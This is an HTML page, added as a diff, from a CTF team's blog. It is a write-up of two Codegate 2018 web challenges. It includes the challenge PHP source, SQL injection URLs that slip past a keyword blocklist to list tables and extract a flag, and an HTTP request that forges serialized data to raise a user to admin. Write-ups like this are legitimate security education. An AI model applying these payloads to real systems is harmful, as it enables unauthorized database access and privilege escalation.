@@ -1,0 +1,1162 @@
+
+
+  
+    
+  
+
+
+  
+
+
+
+
+
+  
+
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="Hugo 0.37 with theme Tranquilpeak 0.4.3-BETA">
+    <title>Team-Eur3kA Blog</title>
+    <meta name="author" content="Team-Eur3kA">
+    <meta name="keywords" content="">
+
+    <link rel="icon" href="https://Team-Eur3kA.github.io/favicon.png">
+    
+
+    
+    <meta name="description" content="codegate 2018 Web writeup Simple CMS Reference: write up from 0ops
+This challenge is a sql injection challenge. In this challenge, we can get the source code of the CMS. First we can se that there is a waf for the whole cms:
+waf.php
+&lt;?php if(!defined(&#39;simple_cms&#39;)) exit(); $method = $_SERVER[&#39;REQUEST_METHOD&#39;]; if($method !== &#39;GET&#39; &amp;&amp; $method !== &#39;POST&#39;){ exit(&#39;are you hacker?&#39;); } $filter_str = array(&#39;or&#39;, &#39;and&#39;, &#39;information&#39;, &#39;schema&#39;, &#39;procedure&#39;, &#39;analyse&#39;, &#39;order&#39;, &#39;by&#39;, &#39;group&#39;, &#39;into&#39;); function escape_str($array) { if(is_array($array)) { foreach($array as $key =&gt; $value) { if(is_array($value)) { $array[$key] = escape_str($value); } else { $array[$key] = filter($value); } } } else { $array = filter($array); } return $array; } function filter($str){ global $filter_str; foreach ($filter_str as $value) { if(stripos($str, $value) !">
+    <meta property="og:description" content="codegate 2018 Web writeup Simple CMS Reference: write up from 0ops
+This challenge is a sql injection challenge. In this challenge, we can get the source code of the CMS. First we can se that there is a waf for the whole cms:
+waf.php
+&lt;?php if(!defined(&#39;simple_cms&#39;)) exit(); $method = $_SERVER[&#39;REQUEST_METHOD&#39;]; if($method !== &#39;GET&#39; &amp;&amp; $method !== &#39;POST&#39;){ exit(&#39;are you hacker?&#39;); } $filter_str = array(&#39;or&#39;, &#39;and&#39;, &#39;information&#39;, &#39;schema&#39;, &#39;procedure&#39;, &#39;analyse&#39;, &#39;order&#39;, &#39;by&#39;, &#39;group&#39;, &#39;into&#39;); function escape_str($array) { if(is_array($array)) { foreach($array as $key =&gt; $value) { if(is_array($value)) { $array[$key] = escape_str($value); } else { $array[$key] = filter($value); } } } else { $array = filter($array); } return $array; } function filter($str){ global $filter_str; foreach ($filter_str as $value) { if(stripos($str, $value) !">
+    <meta property="og:type" content="blog">
+    <meta property="og:title" content="Team-Eur3kA Blog">
+    <meta property="og:url" content="/1/01/">
+    <meta property="og:site_name" content="Team-Eur3kA Blog">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="Team-Eur3kA Blog">
+    <meta name="twitter:description" content="codegate 2018 Web writeup Simple CMS Reference: write up from 0ops
+This challenge is a sql injection challenge. In this challenge, we can get the source code of the CMS. First we can se that there is a waf for the whole cms:
+waf.php
+&lt;?php if(!defined(&#39;simple_cms&#39;)) exit(); $method = $_SERVER[&#39;REQUEST_METHOD&#39;]; if($method !== &#39;GET&#39; &amp;&amp; $method !== &#39;POST&#39;){ exit(&#39;are you hacker?&#39;); } $filter_str = array(&#39;or&#39;, &#39;and&#39;, &#39;information&#39;, &#39;schema&#39;, &#39;procedure&#39;, &#39;analyse&#39;, &#39;order&#39;, &#39;by&#39;, &#39;group&#39;, &#39;into&#39;); function escape_str($array) { if(is_array($array)) { foreach($array as $key =&gt; $value) { if(is_array($value)) { $array[$key] = escape_str($value); } else { $array[$key] = filter($value); } } } else { $array = filter($array); } return $array; } function filter($str){ global $filter_str; foreach ($filter_str as $value) { if(stripos($str, $value) !">
+    
+    
+
+    
+    
+
+    
+      <meta property="og:image" content="https://farscapedevelopment.files.wordpress.com/2012/07/eureka.gif">
+    
+
+    
+    
+    
+
+    
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css" integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin="anonymous" />
+    
+    
+    <link rel="stylesheet" href="https://Team-Eur3kA.github.io/css/style-jsjn0006wyhpyzivf6yceb31gvpjatbcs3qzjvlumobfnugccvobqwxnnaj8.min.css" />
+    
+    
+
+    
+      
+    
+    
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="4">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://Team-Eur3kA.github.io/">Team-Eur3kA Blog</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://Team-Eur3kA.github.io/#about">
+    
+    
+    
+      
+        <img class="header-picture" src="https://farscapedevelopment.files.wordpress.com/2012/07/eureka.gif" alt="Author&#39;s picture" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="4">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://Team-Eur3kA.github.io/#about">
+          <img class="sidebar-profile-picture" src="https://farscapedevelopment.files.wordpress.com/2012/07/eureka.gif" alt="Author&#39;s picture" />
+        </a>
+        <h4 class="sidebar-profile-name">Team-Eur3kA</h4>
+        
+          <h5 class="sidebar-profile-bio">CTF Security Team Eur3kA deriving from former united team FFF-PKyou which consists of members from multiple united team FFF and Peking University team PKyou</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Team-Eur3kA.github.io/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+      
+      <span class="sidebar-button-desc">Home</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Team-Eur3kA.github.io/categories">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
+      
+      <span class="sidebar-button-desc">Categories</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Team-Eur3kA.github.io/tags">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+      
+      <span class="sidebar-button-desc">Tags</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Team-Eur3kA.github.io/archives">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
+      
+      <span class="sidebar-button-desc">Archives</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Team-Eur3kA.github.io/#about">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+      
+      <span class="sidebar-button-desc">About</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/kakawait" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://stackoverflow.com/users/636472/kakawait" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-stack-overflow"></i>
+      
+      <span class="sidebar-button-desc">Stack Overflow</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Team-Eur3kA.github.io/index.xml">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-rss"></i>
+      
+      <span class="sidebar-button-desc">RSS</span>
+    </a>
+  </li>
+
+
+    </ul>
+  </div>
+</nav>
+
+      
+
+      <div id="main" data-behavior="4"
+        class="
+               hasCoverMetaIn
+               ">
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+          
+            <div class="post-header main-content-wrap text-left">
+  
+    <h1 class="post-title" itemprop="headline">
+      
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time itemprop="datePublished" datetime="0001-01-01T00:00:00Z">
+        
+  January 1, 1
+
+      </time>
+    
+    
+  </div>
+
+</div>
+          
+          <div class="post-content markdown" itemprop="articleBody">
+            <div class="main-content-wrap">
+              
+
+<h1 id="codegate-2018-web-writeup">codegate 2018 Web writeup</h1>
+
+<h2 id="simple-cms">Simple CMS</h2>
+
+<p><strong>Reference: <a href="https://ctftime.org/writeup/8619">write up from 0ops</a></strong></p>
+
+<p>This challenge is a sql injection challenge. In this challenge, we can get the source code of the CMS. First we can se that there is a waf for the whole cms:</p>
+
+<p>waf.php</p>
+
+<pre><code class="language-php">&lt;?php
+	if(!defined('simple_cms')) exit();
+
+	$method = $_SERVER['REQUEST_METHOD'];
+
+	if($method !== 'GET' &amp;&amp; $method !== 'POST'){
+			exit('are you hacker?');
+	}
+
+	$filter_str = array('or', 'and', 'information', 'schema', 'procedure', 'analyse', 'order', 'by', 'group', 'into');
+
+	function escape_str($array)
+	{
+	    if(is_array($array)) {
+	        foreach($array as $key =&gt; $value) {
+	            if(is_array($value)) {
+	                $array[$key] = escape_str($value);
+	            } else {
+	                $array[$key] = filter($value);
+	            }
+	        }
+	    }
+	    else {
+	        $array = filter($array);
+	    }
+	    return $array;
+	}
+	function filter($str){
+		global $filter_str;
+
+		foreach ($filter_str as $value) {
+			if(stripos($str, $value) !== false){
+				die('are you hacker?');
+			}
+		}
+		return addslashes($str);
+	}
+
+	$_GET = escape_str($_GET);
+	$_POST = escape_str($_POST);
+	$_COOKIE = escape_str($_COOKIE);
+	$_REQUEST = escape_str($_REQUEST);
+?&gt;
+</code></pre>
+
+<p>We can see that some key words used in sql injection are filtered. The single quotation mark is also filtered.</p>
+
+<p>Then we find that the author of the CMS use some sql api written by himself in  <code>DB.class.php</code>:</p>
+
+<pre><code class="language-php">&lt;?php
+	if(!defined('simple_cms')) exit();
+	class DB{
+		private static $db = null;
+		public static function getInstance()
+    	{
+        	if (null === static::$db) {
+        		static::$db = mysqli_connect($GLOBALS['db_host'], $GLOBALS['db_user'], $GLOBALS['db_password'], $GLOBALS['db_name']);
+        	}
+        	return static::$db;
+    	}
+        function insert($table, $query){
+            $table = $GLOBALS['table_prefix'] . $table;
+
+            $result = 'INSERT INTO ' . $table . ' ';
+
+            $column = '';
+            $data = '';
+            foreach ($query as $key =&gt; $value) {
+                $column .= '`' . $key . '`, ';
+                $data .= &quot;'{$value}', &quot;;
+            }
+
+            $column = substr($column, 0, strrpos($column, ','));
+            $data = substr($data, 0, strrpos($data, ','));
+
+            $result .= &quot;({$column}) VALUES ({$data})&quot;;
+
+            echo &quot;&lt;b&gt;Insert Action&lt;/b&gt;&lt;/br&gt;&quot;;
+            echo $result . &quot;&lt;/br&gt;&quot;;
+            $result = mysqli_query(static::$db, $result);
+            return $result;
+        }
+        function update($table, $replace, $query, $operator=''){
+            $table = $GLOBALS['table_prefix'] . $table;
+            $result = 'UPDATE '.$table. ' SET ';
+
+            foreach ($replace as $key =&gt; $value) {
+                $result .= &quot;{$key}='{$value}',&quot;;
+            }
+
+            $result = substr($result, 0, strrpos($result, ',')) . ' WHERE ';
+
+            foreach ($query as $key =&gt; $value) {
+                $result .= &quot;{$key}='{$value}' {$operator} &quot;;
+            }
+
+            if($operator){
+                $result = trim(substr($result, 0, strrpos($result, $operator)));
+            }
+            else{
+                $result = trim($result);
+            }
+            echo &quot;&lt;b&gt;Update Action&lt;/b&gt;&lt;/br&gt;&quot;;
+            echo $result . &quot;&lt;/br&gt;&quot;;
+            $result = mysqli_query(static::$db, $result);
+            return $result;
+        }
+        function fetch_row($table, $query=array(), $operator=''){
+            $table = $GLOBALS['table_prefix'] . $table;
+            $result = 'SELECT * FROM '. $table;
+
+            if($query){
+                $result .=  ' WHERE ';
+
+                foreach ($query as $key =&gt; $value) {
+                    $result .= &quot;{$key}='{$value}' {$operator} &quot;;
+                }
+                if($operator){
+                    $result = trim(substr($result, 0, strrpos($result, $operator)));
+                }
+                else{
+                    $result = trim($result);
+                }
+            }
+            echo &quot;&lt;b&gt;Fetch row Action&lt;/b&gt;&lt;/br&gt;&quot;;
+            echo $result . &quot;&lt;/br&gt;&quot;;
+            $result = mysqli_query(static::$db, $result);
+            if(!$result){
+                exit(mysqli_error(static::$db));
+            }
+            return mysqli_fetch_array($result, MYSQLI_ASSOC);
+        }
+        function fetch_multi_row($table, $query=array(), $operator='', $limit='', $orderby='', $condition=''){
+            $table = $GLOBALS['table_prefix'] . $table;
+            $result = 'SELECT * FROM '. $table;
+            if($condition){
+                $result .= ' WHERE '. $condition;
+            }
+            else if($query){
+                $result .=  ' WHERE ';
+
+                foreach ($query as $key =&gt; $value) {
+                    $result .= &quot;{$key}='{$value}' {$operator} &quot;;
+                }
+                if($operator){
+                    $result = trim(substr($result, 0, strrpos($result, $operator)));
+                }
+                else{
+                    $result = trim($result);
+                }
+            }
+            else{
+                $result .= ' WHERE 1 ';
+            }
+            if($orderby){
+                $result .= ' order by '.$orderby;
+            }
+            if($limit){
+                $result .= ' limit '. $limit;
+            }
+            echo &quot;&lt;b&gt;Fetch multi row Action&lt;/b&gt;&lt;/br&gt;&quot;;
+            echo $result . &quot;&lt;/br&gt;&quot;;
+            $result = mysqli_query(static::$db, $result);
+            if(!$result){
+                exit(mysqli_error(static::$db));
+            }
+            $tmp = array();
+            $i = 0;
+            while($row = mysqli_fetch_array($result, MYSQLI_ASSOC)){
+                $tmp[$i] = $row;
+                $i++;
+            }
+            return $tmp;
+        }
+
+	}
+?&gt;
+</code></pre>
+
+<p>The vulnerable is in function <code>fetch_multi_row</code> and <code>fetch_row</code>, which we can control part of the sql statement that is not in single quotations in <code>where</code> and <code>order by</code> and <code>limit</code> statement.</p>
+
+<p>In file <code>Board.class.php</code>, function <code>action_search</code> seems vulnerable, which calls another function <code>get_search_query</code> to generate sql statement. Let&rsquo;s get a closer look at this function:</p>
+
+<pre><code class="language-php">	function get_search_query($column, $search, $operator){
+		$column = explode('|', $column);
+		$result = '';
+		for($i=0; $i&lt;count($column); $i++){
+			if(trim($column[$i]) === ''){
+				continue;
+			}
+			$result .= &quot; LOWER({$column[$i]}) like '%{$search}%' {$operator}&quot;;
+		}
+		$result = trim(substr($result, 0 , strrpos($result, $operator)));
+		return $result;
+	}
+</code></pre>
+
+<p>As we can see, the final query statement contain the variable <code>$column</code> and <code>$search</code>, which could be controlled by attacker. To get further usage of this function, we need to know that function <code>mysqli_query</code> can execute lines of sql statements. So we use <code>$column</code> to start a new line and use <code>$search</code> to query in a new line, like:</p>
+
+<pre><code class="language-html">http://13.125.3.183/index.php?act=board&amp;mid=search&amp;col=title%23&amp;type=1&amp;search=test%0a)%23
+</code></pre>
+
+<p>Then we have to get the table name and column name in database. Since key words &ldquo;information&rdquo; and &ldquo;schema&rdquo; are in black list, we use <code>innodb_table_stats</code> to get the table name:</p>
+
+<pre><code class="language-html">http://13.125.3.183/index.php?act=board&amp;mid=search&amp;col=title%23&amp;type=1&amp;search=test%0a)%3C0%20union%20select%201,(select%20table_name%20from%20mysql.innodb_table_stats%20limit%202,1),3,4,5%23
+</code></pre>
+
+<p>At last, we use <code>join</code> to get flag:</p>
+
+<pre><code class="language-html">http://13.125.3.183/index.php?act=board&amp;mid=search&amp;col=title%23&amp;type=1&amp;search=test%0A)%3C0%20union%20(select%201,t.*%20from%20mysql.user%20join%2041786c497656426a6149_flag%20t)%23
+</code></pre>
+
+<h2 id="rbsql">rbSql</h2>
+
+<p>We can also get the source code of this challenge too, which is a data storage system written in php. The rbSql will store user information in file and read it again when user login and then check if user is admin.</p>
+
+<pre><code class="language-php">  elseif($page == &quot;me&quot;){
+    echo &quot;&lt;p&gt;uid : {$_SESSION['uid']}&lt;/p&gt;&lt;p&gt;level : &quot;;
+    if($_SESSION['lvl'] == 1) echo &quot;Guest&quot;;
+    elseif($_SESSION['lvl'] == 2) echo &quot;Admin&quot;;
+    echo &quot;&lt;/p&gt;&quot;;
+    include &quot;dbconn.php&quot;;
+    $ret = rbSql(&quot;select&quot;,&quot;member_&quot;.$_SESSION['uid'],[&quot;id&quot;,$_SESSION['uid']]);
+    echo &quot;&lt;p&gt;mail : {$ret['1']}&lt;/p&gt;&lt;p&gt;ip : {$ret['3']}&lt;/p&gt;&quot;;
+    if($_SESSION['lvl'] === &quot;2&quot;){
+      echo &quot;&lt;p&gt;Flag : &lt;/p&gt;&quot;;
+      include &quot;/flag&quot;;
+      echo &quot;flag{XXXXXXXXXXXXXXXXXXXXXXXXXXXX}&quot;;
+      rbSql(&quot;delete&quot;,&quot;member_&quot;.$_SESSION['uid'],[&quot;id&quot;,$_SESSION['uid']]);
+    }
+  }
+</code></pre>
+
+<p>If the user&rsquo;s <code>lvl</code> value is 2, we get the flag. So let&rsquo;s have a closer look at the data storage system:</p>
+
+<pre><code class="language-php">&lt;?php
+/*
+Table[
+  tablename, filepath
+  [column],
+  [row],
+  [row],
+  ...
+rbSqlSchema[
+  rbSqlSchema,/rbSqlSchema,
+  [&quot;tableName&quot;,&quot;filePath&quot;],
+  [&quot;something&quot;,&quot;/rbSql_&quot;.substr(md5(rand(10000000,100000000)),0,16)]
+]
+*/
+
+define(&quot;STR&quot;, chr(1), true);
+define(&quot;ARR&quot;, chr(2), true);
+define(&quot;SCHEMA&quot;, &quot;../../rbSql/rbSqlSchema&quot;, true);
+
+function rbSql($cmd,$table,$query){
+	switch($cmd){
+	case &quot;create&quot;:
+		$result = rbReadFile(SCHEMA);
+		for($i=3;$i&lt;count($result);$i++){
+			if(strtolower($result[$i][0]) === strtolower($table)){
+				return &quot;Error6&quot;;
+			}
+		}
+		$fileName = &quot;../../rbSql/rbSql_&quot;.substr(md5(rand(10000000,100000000)),0,16);
+		$result[$i] = array($table,$fileName);
+		rbWriteFile(SCHEMA,$result);
+		exec(&quot;touch {$fileName};chmod 666 {$fileName}&quot;);
+		$content = array($table,$fileName,$query);
+		rbWriteFile($fileName,$content);
+		break;
+
+	case &quot;select&quot;:
+		/*
+		  Error1 : Command not found
+		  Error2 : Column not found
+		  Error3 : Value not found
+		  Error4 : Table name not found
+		  Error5 : Column count is different
+		  Error6 : table name duplicate
+		*/
+		$filePath = rbGetPath($table);
+		if(!$filePath) return &quot;Error4&quot;;
+		$result = rbReadFile($filePath);
+		$whereColumn = $query[0];
+		$whereValue = $query[1];
+		$countRow = count($result) - 3;
+		$chk = 0;
+		for($i=0;$i&lt;count($result[2]);$i++){
+			if(strtolower($result[2][$i]) === strtolower($whereColumn)){
+				$chk = 1;
+				break;
+			}
+		}
+		if($chk == 0) return &quot;Error2&quot;;
+		$chk = 0;
+        print_r($result);
+		for($j=0;$j&lt;$countRow;$j++){
+			if(strtolower($result[$j+3][$i]) === strtolower($whereValue)){
+				$chk = 1;
+				return $result[$j+3];
+			}
+		}
+		if($chk == 0) return &quot;Error3&quot;;
+		break;
+
+	case &quot;insert&quot;:
+        echo &quot;Table: &quot; . $table . &quot;&lt;/br&gt;\n&quot;;
+		$filePath = rbGetPath($table);
+		if(!$filePath) return &quot;Error4&quot;;
+		$result = rbReadFile($filePath);
+		if(count($result[2]) != count($query)) return &quot;Error5&quot;;
+        $result[count($result)] = $query;
+        print_r($result);
+		rbWriteFile($filePath,$result);
+		break;
+
+	case &quot;delete&quot;:
+		$filePath = rbGetPath($table);
+		if(!$filePath) return &quot;Error4&quot;;
+		$result = rbReadFile($filePath);
+		$whereColumn = $query[0];
+		$whereValue = $query[1];
+		$countRow = count($result) - 3;
+		$chk = 0;
+		for($i=0;$i&lt;count($result[2]);$i++){
+			if(strtolower($result[2][$i]) === strtolower($whereColumn)){
+				$chk = 1;
+				break;
+			}
+		}
+		if($chk == 0) return &quot;Error2&quot;;
+		$chk = 0;
+		for($j=0;$j&lt;$countRow;$j++){
+			if(strtolower($result[$j+3][$i]) === strtolower($whereValue)){
+				$chk = 1;
+				unset($result[$j+3]);
+			}
+		}
+		if($chk == 0) return &quot;Error3&quot;;
+		rbWriteFile($result[1],$result);
+		break;
+
+	default:
+		return &quot;Error1&quot;;
+		break;
+	}
+}
+
+function rbParse($rawData){
+	$parsed = array();
+	$idx = 0;
+	$pointer = 0;
+
+	while(strlen($rawData)&gt;$pointer){
+		if($rawData[$pointer] == STR){
+			$pointer++;
+			$length = ord($rawData[$pointer]);
+			$pointer++;
+			$parsed[$idx] = substr($rawData,$pointer,$length);
+			$pointer += $length;
+		}
+		elseif($rawData[$pointer] == ARR){
+			$pointer++;
+			$arrayCount = ord($rawData[$pointer]);
+			$pointer++;
+			for($i=0;$i&lt;$arrayCount;$i++){
+				if(substr($rawData,$pointer,1) == ARR){
+					$pointer++;
+					$arrayCount2 = ord($rawData[$pointer]);
+					$pointer++;
+					for($j=0;$j&lt;$arrayCount2;$j++){
+						$pointer++;
+						$length = ord($rawData[$pointer]);
+						$pointer++;
+						$parsed[$idx][$i][$j] = substr($rawData,$pointer,$length);
+						$pointer += $length;
+                    }
+                    echo &quot;Unpack subarray len: &quot;;
+                    echo $arrayCount2;
+                    echo &quot;\n&quot;;
+                    echo &quot;DATA:&quot;;
+                    print_r($parsed[$idx][$i]);
+			    }
+				else{
+					$pointer++;
+					$length = ord(substr($rawData,$pointer,1));
+					$pointer++;
+					$parsed[$idx][$i] = substr($rawData,$pointer,$length);
+					$pointer += $length;
+				}
+			}
+            echo &quot;Unpack array len: &quot;;
+            echo $arrayCount;
+            echo &quot;\n&quot;;
+            echo &quot;DATA:&quot;;
+            print_r($parsed[$idx]);
+		}
+		$idx++;
+		if($idx &gt; 2048) break;
+	}
+	return $parsed[0];
+}
+
+function rbPack($data){
+	$rawData = &quot;&quot;;
+	if(is_string($data)){
+		$rawData .= STR . chr(strlen($data)) . $data;
+	}
+	elseif(is_array($data)){
+        echo &quot;Packing array len: &quot;;
+        echo ord(chr(count($data)));
+        echo &quot;\n&quot;;
+        echo &quot;DATA:&quot;;
+        print_r($data);
+		$rawData .= ARR . chr(count($data));
+		for($idx=0;$idx&lt;count($data);$idx++) $rawData .= rbPack($data[$idx]);
+	}
+	return $rawData;
+}
+
+function rbGetPath($table){
+	$schema = rbReadFile(SCHEMA);
+	for($i=3;$i&lt;count($schema);$i++){
+		if(strtolower($schema[$i][0]) == strtolower($table)) return $schema[$i][1];
+	}
+}
+
+function rbReadFile($filePath){
+	$opened = fopen($filePath, &quot;r&quot;) or die(&quot;Unable to open file!&quot;);
+	$content = fread($opened,filesize($filePath));
+	fclose($opened);
+	return rbParse($content);
+}
+
+function rbWriteFile($filePath,$fileContent){
+	$opened = fopen($filePath, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);
+    $content = rbPack($fileContent);
+	fwrite($opened,$content);
+	fclose($opened);
+	clearstatcache();
+}
+</code></pre>
+
+<p>After reading the source code, I find a interesting point that the function <code>rbPack</code> packs the data recursively, but the unpack function <code>rbParse</code> only use loop, and it doesn&rsquo;t check the type of data in the inner loop. So if we arrange our data carefully, we may forge the unpack function to change the user level.</p>
+
+<p>We can easily find something controllable when we register:</p>
+
+<pre><code class="language-php">  elseif($page == &quot;join_chk&quot;){
+    $uid = $_POST['uid'];
+    $umail = $_POST['umail'];
+    $upw = $_POST['upw'];
+    if(($uid) &amp;&amp; ($upw) &amp;&amp; ($umail)){
+      if(strlen($uid) &lt; 3) error(&quot;id too short&quot;);
+      if(strlen($uid) &gt; 16) error(&quot;id too long&quot;);
+      if(!ctype_alnum($uid)) error(&quot;id must be alnum!&quot;);
+      if(strlen($umail) &gt; 256) error(&quot;email too long&quot;);
+      include &quot;dbconn.php&quot;;
+      $upw = md5($upw);
+      $uip = $_SERVER['REMOTE_ADDR'];
+      if(rbGetPath(&quot;member_&quot;.$uid)) error(&quot;id already existed&quot;);
+      $ret = rbSql(&quot;create&quot;,&quot;member_&quot;.$uid,[&quot;id&quot;,&quot;mail&quot;,&quot;pw&quot;,&quot;ip&quot;,&quot;lvl&quot;]);
+      if(is_string($ret)) error(&quot;error&quot;);
+      $ret = rbSql(&quot;insert&quot;,&quot;member_&quot;.$uid,[$uid,$umail,$upw,$uip,&quot;1&quot;]);
+      if(is_string($ret)) error(&quot;error&quot;);
+      exit(&quot;&lt;script&gt;location.href='./?page=login';&lt;/script&gt;&quot;);
+    }
+    else error(&quot;join fail&quot;);
+  }
+</code></pre>
+
+<p>The <code>umail</code> is controllable and long enough to make some fake information.</p>
+
+<p>When we register a normal user, which is innocent, the storage file looks like this:</p>
+
+<pre><code>ARR
+4
+  STR
+    (length of table name)
+    table name string
+  STR
+    (length of path)
+    path string
+  ARR
+  5 -&gt; each member has 5 attributes
+    STR
+      2
+      &quot;id&quot;
+    STR
+      4
+      &quot;mail&quot;
+    STR
+      2
+      &quot;pw&quot;
+    STR
+      2
+      &quot;ip&quot;
+    STR
+      3
+      &quot;lvl&quot;
+  ARR
+  5
+  	STR
+  	  (length of id)
+  	  id
+  	STR
+  	  (length of mail)
+  	  mail
+  	STR
+  	  (length of pw)
+  	  pw
+  	STR
+  	  (length of ip)
+  	  ip
+  	STR
+  	  (length of lvl)
+  	  lvl
+</code></pre>
+
+<p>Our input data is stored the tail of the file. Since <code>pw</code>, <code>ip</code>, <code>id</code>, <code>lvl</code> is difficult to control, we use <code>mail</code> to overwrite the data behind it. When we pass <code>mail</code> to server as a array, we can write as much data into the file as we want. When <code>rbParse</code> function parse the email, the buggy function will consider the <code>mail</code> as a STR instead of an ARR. So let&rsquo;s see our payload:</p>
+
+<pre><code class="language-html">POST /a/b/?page=join_chk HTTP/1.1
+Host: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+Content-Length: 101
+Cache-Control: max-age=0
+Origin: http://59.108.116.175:9902
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: http://59.108.116.175:9902/a/b/?page=join
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+Cookie: PHPSESSID=ff02df7dc3800b1b0b51c47068600d3e
+Connection: close
+
+uid=n0b0dy&amp;umail[]=he&amp;umail[]=f57de2db3c42252c1c1fc931bdbdee98&amp;umail[]=127.0.0.2&amp;umail[]=2&amp;upw=n0b0dy
+</code></pre>
+
+<p>We pass <code>umail</code> to rbSql as a array, and the length of the array is 4. The first element in array is the fake <code>umail</code>, whose length should be array length minus the length of metadata(STR, length of string). So the length of <code>umail</code> should be 2. The second element is the fake password, which is the md5 value of <code>upw</code> string. The second element is the remote address, which can be any string in our payload. Then the last element is the user level, which should be set to &ldquo;2&rdquo; to get flag. The original data follows or payload will not be parsed. Send the payload then login, we can get the flag.</p>
+
+              
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+            
+            
+  <div class="post-actions-wrap">
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://Team-Eur3kA.github.io/2018/02/welcome-to-team-eur3ka-site/" data-tooltip="Welcome to Team Eur3kA site">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--disabled">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://Team-Eur3kA.github.io/1/01/">
+              <i class="fa fa-facebook-official"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://Team-Eur3kA.github.io/1/01/">
+              <i class="fa fa-twitter"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://Team-Eur3kA.github.io/1/01/">
+              <i class="fa fa-google-plus"></i>
+            </a>
+          </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+
+
+            
+              
+                <div id="disqus_thread">
+  <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+              
+            
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2018 Team-Eur3kA. All Rights Reserved
+  </span>
